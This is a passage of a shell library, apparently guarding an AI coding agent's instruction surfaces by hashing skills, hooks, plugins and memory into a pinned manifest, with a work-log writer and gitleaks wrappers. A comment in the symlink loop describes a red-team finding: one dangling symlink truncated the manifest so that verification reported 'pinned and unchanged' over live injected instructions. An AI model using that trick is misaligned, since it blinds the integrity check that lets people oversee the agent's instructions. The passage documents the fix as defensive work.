          if [ "$_pm" = installed_plugins.json ] && [ -n "$_ld" ]; then
            printf '%s  %s\n' "$(floor_installed_sha "$_p/$_pm")" "$_pmrel"
          else
            printf '%s  %s\n' "$(floor_pluginmeta_sha "$_p/$_pm")" "$_pmrel"
          fi
        done
        # harbor#478: each loaded plugin's files, under a label naming the entry that loads
        # it (key, scope, project), never the version dir. An entry whose dir is gone is `absent`.
        if [ -n "$_ld" ]; then
          printf '%s\n' "$_ld" | while IFS="$(printf '\t')" read -r _lk _ls _lp _li; do
            [ -n "$_lk" ] || continue
            # `//`: no walked path has one, so a real plugins/loaded/ file never wears a label.
            # The project is %-escaped, never folded, so /a-b and /a/b stay two labels.
            _ll="plugins//loaded/$_lk/$_ls"
            [ "$_lp" = - ] || _ll="$_ll/$(printf '%s' "$_lp" | sed 's/%/%25/g; s#/#%2F#g')"
            if [ "$_li" != - ] && [ -d "$_li" ]; then floor_instr_tree "$_li" "$_ll"
            else printf 'absent  %s\n' "$_ll"; fi
          done
        fi
        # Re-emit every marketplace CATALOG in sha-normalized form. A find rather
        # than the fixed path the loop above uses: catalogs live one per marketplace
        # at plugins/marketplaces/<mp>/.claude-plugin/marketplace.json, so there are
        # N of them and none sits at the surface root. printf is the last command in
        # the body deliberately — a false test in that position kills the pipeline
        # under `set -eu` and SILENTLY TRUNCATES the manifest, which is the B8-02
        # mechanism the symlink loop below documents at length.
        find "$_p" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
             -name marketplace.json -type f -print 2>/dev/null | while IFS= read -r _mk; do
          _mkrel="$(printf '%s' "$_mk" | awk -v n="${#_cfg}" '{print substr($0, n+2)}')"
          printf '%s  %s\n' "$(floor_marketplace_sha "$_mk")" "$_mkrel"
        done
        # The plugins surface's .marketplaces.json, excluded above and re-emitted clock-free (floor_syncmeta_sha).
        [ "$_bk3" != .marketplaces.json ] || find "$_p" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
             -name .marketplaces.json -type f -print 2>/dev/null | while IFS= read -r _sm; do
          _smrel="$(printf '%s' "$_sm" | awk -v n="${#_cfg}" '{print substr($0, n+2)}')"
          printf '%s  %s\n' "$(floor_syncmeta_sha "$_sm")" "$_smrel"
        done
        find "$_p" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
             ! -name .last_inuse_sweep -type l -print 2>/dev/null | while IFS= read -r _l; do
          _rel="$(printf '%s' "$_l" | awk -v n="${#_cfg}" '{print substr($0, n+2)}')"
          printf 'link:%s  %s\n' "$(readlink "$_l" 2>/dev/null || echo '?')" "$_rel"
          # A symlink to a regular FILE is hashed through the link, so swapping
          # its target content is drift (that was B8-02). A symlink to a
          # DIRECTORY is recorded by target only — see the note above.
          #
          # `if`, NOT `[ … ] && …`. As the LAST command of this while body, a
          # false test made the loop exit 1, which killed the enclosing pipeline
          # under `set -eu` and SILENTLY TRUNCATED the manifest at the first
          # surface containing a broken or directory symlink. Weaponised in pass
          # 11 (B8-02, critical): one `ln -s /nonexistent <cfg>/agents/x` — a
          # write into a surface that is writable by design — dropped skills,
          # commands, hooks, plugins and memory from BOTH the pin and the live
          # manifest, so the diff was empty forever and floor-verify reported
          # "✓ instruction surfaces pinned and unchanged" over live injections.
          if [ -f "$_l" ]; then printf '%s  %s\n' "$(floor_sha < "$_l")" "$_rel"; fi
        done
      else
        printf '%s  %s\n' "absent" "$_s"
      fi
    done
  done | LC_ALL=C sort -k2
}

# ── the work-log record writer (G2 + harbor#6) ──────────────────────────────
# ONE implementation, because there are now two callers: worklog-push.sh writes
# a record when a session STOPS, and memory-harvest.sh writes one when it finds a
# session that stopped without ever reaching that hook — a crash, a kill, a
# machine that slept. Two open-coded writers of one format drift, and the drift
# is invisible: both keep producing files, they just stop being the same shape,
# and the corpus that is supposed to be uniform quietly is not.
#
# CREATE-IF-ABSENT, THEN APPEND. The Stop hook fires more than once per session,
# and each firing is a real event worth a line. Idempotency for the reconciler is
# therefore the RECONCILER's job — it checks the record exists before calling —
# rather than a mode flag here, so this function has one behaviour instead of two.
#
#   floor_worklog_record <log-dir> <host> <session-id> <date> <time> <cwd> [source]
#
# `source` lands in the frontmatter, not in the line. A backfilled record is
# genuinely different from a live one — its clock is the transcript's mtime, not
# the moment work happened — and a reader deserves to know which they are looking
# at. Keeping it out of the line means the body stays uniform for retrieval.
floor_worklog_record() {
  _wr_dir="${1:-}"; _wr_host="${2:-}"; _wr_sid="${3:-}"
  _wr_date="${4:-}"; _wr_time="${5:-}"; _wr_cwd="${6:-}"; _wr_src="${7:-}"
  [ -n "$_wr_dir" ] && [ -n "$_wr_host" ] && [ -n "$_wr_sid" ] || return 1
  _wr_recdir="$_wr_dir/WORK/sessions/$_wr_host"
  mkdir -p "$_wr_recdir" 2>/dev/null || return 1
  _wr_rec="$_wr_recdir/$_wr_date-$_wr_sid.md"
  if [ ! -f "$_wr_rec" ]; then
    if [ -n "$_wr_src" ]; then
      printf -- '---\nhost: %s\nsession: %s\ndate: %s\nsource: %s\n---\n' \
        "$_wr_host" "$_wr_sid" "$_wr_date" "$_wr_src" > "$_wr_rec" 2>/dev/null || return 1
    else
      printf -- '---\nhost: %s\nsession: %s\ndate: %s\n---\n' \
        "$_wr_host" "$_wr_sid" "$_wr_date" > "$_wr_rec" 2>/dev/null || return 1
    fi
  fi
  printf -- '- %s · cwd: %s\n' "$_wr_time" "${_wr_cwd:-unknown}" >> "$_wr_rec" 2>/dev/null || return 1
}

# ─────────────────────────────────────────────────────────────────────────────
# THE GITLEAKS SUBCOMMAND IS A DIALECT, AND ITS ABSENCE LOOKS LIKE A FINDING.
#
# gitleaks 8.19 introduced `gitleaks git` and folded --pre-commit/--staged into
# it. 8.18.4 has NO `git` subcommand — its verbs are detect, protect, version,
# completion, help — and an unknown command exits 1. Every caller here runs the
# scanner with `--exit-code 1`, i.e. "1 means a leak was found", so on 8.18.4 the
# two outcomes are INDISTINGUISHABLE: a missing subcommand reads as a secret.
#
# That is not hypothetical and it is not a corner. `.github/workflows/
# governance.yml` installs v8.18.4 by exact URL and its preflight checks
# `command -v gitleaks` — presence, not surface — so on a hosted runner the
# work-log gate refused every commit while reporting a finding, and floor-test's
# C1a teeth arm went red saying "the allowlist committed NOTHING". Measured
# 2026-09-06 against 8.18.4.
#
# PROBE, NEVER ASSUME, and never pin a version here: the operator's box may carry
# either, and this must not decide for them. `--help` on the subcommand is the
# cheapest true answer — it exits 0 where the verb exists and non-zero where it
# does not.
#
# THE FALLBACK REALLY SCANS, and that was measured as a matched PAIR rather than
# asserted, because an allow-only result is indistinguishable from a scanner that
# does nothing: `protect --staged` on a planted synthetic token exits 1, and on a
# clean staged tree exits 0. `detect` likewise catches a planted token in a tree.
# 8.18's `protect --staged` IS its documented pre-commit path, which is what
# 8.19's `git --pre-commit --staged` renamed.
#
# FAIL-CLOSED IS THE CALLER'S JOB, not this function's. Both helpers return the
# scanner's own verdict — 0 clean, non-zero otherwise — and every caller already
# treats non-zero as "block". A helper that swallowed a scan failure would be the
# fail-open shape the floor exists to refuse.

floor_gitleaks_staged() { # <repo-dir> — 0 iff the STAGED snapshot is clean
  if gitleaks git --help >/dev/null 2>&1; then
    gitleaks git --pre-commit --staged --no-banner --exit-code 1 "$1"
  else
    gitleaks protect --staged --no-banner --exit-code 1 --source "$1"
  fi
}

floor_gitleaks_tree() { # <repo-dir> — 0 iff the repo and its history are clean
  if gitleaks git --help >/dev/null 2>&1; then
    gitleaks git --no-banner --exit-code 1 "$1"
  else
    gitleaks detect --no-banner --exit-code 1 --source "$1"
  fi
}
